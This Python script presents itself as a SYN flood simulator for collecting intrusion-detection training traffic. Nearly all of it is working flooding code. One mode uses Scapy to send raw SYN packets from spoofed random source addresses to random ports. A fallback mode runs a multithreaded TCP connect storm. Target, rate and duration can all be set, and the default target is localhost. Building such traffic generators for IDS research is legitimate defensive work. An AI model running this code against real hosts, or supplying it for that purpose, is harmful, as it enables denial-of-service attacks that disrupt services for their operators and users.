#!/usr/bin/env python3
# tools/attack_simulators/syn_flood.py
# ─────────────────────────────────────────────────────────────────────────────
# SYN Flood simulator for IDS training data collection.
#
# Two modes:
#   1. Scapy (requires admin + Npcap on Windows) — raw SYN packets, realistic
#   2. Fallback — high-rate TCP connect() storm (no admin needed)
#
# Usage:
#   python tools/attack_simulators/syn_flood.py
#   python tools/attack_simulators/syn_flood.py --target 192.168.1.1 --rate 200
#   python tools/attack_simulators/syn_flood.py --duration 300
# ─────────────────────────────────────────────────────────────────────────────

import argparse
import random
import socket
import sys
import threading
import time
from datetime import datetime

DEFAULT_TARGET   = "127.0.0.1"
DEFAULT_RATE     = 150      # packets/second
DEFAULT_DURATION = 300      # seconds
PORT_RANGE       = (1024, 65000)


def _try_scapy_flood(target: str, rate: int, stop_event: threading.Event,
                     counters: dict):
    try:
        from scapy.all import IP, TCP, send, conf
        conf.verb = 0
    except ImportError:
        return False

    print("  [SYN] Mode: Scapy raw SYN packets")
    interval = 1.0 / rate

    while not stop_event.is_set():
        pkt = (
            IP(dst=target, src=f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
            / TCP(dport=random.randint(*PORT_RANGE), sport=random.randint(1024, 65000),
                  flags="S", seq=random.randint(0, 2**32 - 1))
        )
        try:
            send(pkt, verbose=False)
            counters["sent"] += 1
        except Exception:
            counters["errors"] += 1
        time.sleep(interval)

    return True


def _connect_flood(target: str, rate: int, stop_event: threading.Event,
                   counters: dict, fixed_port: int = 0):
    """
    High-rate TCP connect storm — no raw sockets needed.

    fixed_port=0  → random ports (original behaviour, triggers Port Scan co-fire)
    fixed_port=N  → hammer one port only (clean SYN Flood, no Port Scan co-fire)
    """
    if fixed_port:
        print(f"  [SYN] Mode: TCP connect storm → fixed port {fixed_port} (clean SYN Flood)")
    else:
        print("  [SYN] Mode: TCP connect storm → random ports (multi-signature)")

    interval = 1.0 / rate
    rand_ports = list(range(20, 1024)) + list(range(8000, 9000))

    while not stop_event.is_set():
        port = fixed_port if fixed_port else random.choice(rand_ports)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.05)
        try:
            s.connect((target, port))
            counters["sent"] += 1
        except (ConnectionRefusedError, socket.timeout, OSError):
            counters["sent"] += 1   # SYN was still sent by kernel
        except Exception:
            counters["errors"] += 1
        finally:
            try:
                s.close()
            except Exception:
                pass
        time.sleep(interval)


def _worker(target, rate, stop_event, counters, no_scapy=False, fixed_port=0):
    if not no_scapy and not _try_scapy_flood(target, rate, stop_event, counters):
        _connect_flood(target, rate, stop_event, counters, fixed_port)
    elif no_scapy:
        _connect_flood(target, rate, stop_event, counters, fixed_port)


def run(target: str, rate: int, duration: int, no_scapy: bool = False,
        fixed_port: int = 0):
    print()
    print("=" * 60)
    print("  SYN FLOOD SIMULATOR")
    print(f"  Target  : {target}")
    print(f"  Rate    : ~{rate} packets/s")
    print(f"  Duration: {duration}s")
    if fixed_port:
        print(f"  Port    : {fixed_port} (fixed — clean single-label mode)")
    else:
        print(f"  Port    : random (multi-signature mode)")
    print(f"  Started : {datetime.now().strftime('%H:%M:%S')}")
    print("=" * 60)
    print()
    print("  Run simultaneously:")
    print(f"    python scripts/collect_traffic_windows.py \\")
    print(f"      --interface \"Wi-Fi\" --label \"SYN Flood\" --duration {duration}")
    print()
    print("  Press Ctrl+C to stop early.")
    print()

    counters    = {"sent": 0, "errors": 0}
    stop_event  = threading.Event()

    # Spawn multiple threads for higher throughput
    n_threads = max(1, rate // 50)
    threads = []
    for _ in range(n_threads):
        t = threading.Thread(
            target=_worker,
            args=(target, rate // n_threads, stop_event, counters, no_scapy,
                  fixed_port),
            daemon=True,
        )
        t.start()
        threads.append(t)

    start = time.time()
    try:
        while True:
            elapsed = time.time() - start
            remaining = duration - elapsed
            if remaining <= 0:
                break
            actual_rate = counters["sent"] / max(elapsed, 0.1)
            print(f"\r  Sent: {counters['sent']:>8}  Rate: {actual_rate:>7.1f} pkt/s  "
                  f"Remaining: {int(remaining):>4}s   ", end="", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n  Stopped by user.")

    stop_event.set()
    for t in threads:
        t.join(timeout=2)

    elapsed = time.time() - start
    print(f"\n\n  Done. Sent {counters['sent']} packets in {elapsed:.1f}s "
          f"({counters['sent']/max(elapsed,0.1):.1f} pkt/s avg)")
    print()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SYN Flood attack simulator")
    parser.add_argument("--target",   default=DEFAULT_TARGET,   help="Target IP")
    parser.add_argument("--rate",     type=int, default=DEFAULT_RATE,
                        help="Packets per second")
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION,
                        help="Duration in seconds")
    parser.add_argument("--no-scapy", action="store_true",
                        help="Skip Scapy and use TCP connect storm directly")
    parser.add_argument("--fixed-port", type=int, default=0,
                        help="Hammer one fixed port instead of random ports "
                             "(eliminates Port Scan co-fire, clean SYN Flood demo). "
                             "Recommended: 80. Default: 0 (random)")
    args = parser.parse_args()
    run(args.target, args.rate, args.duration, no_scapy=args.no_scapy,
        fixed_port=args.fixed_port)
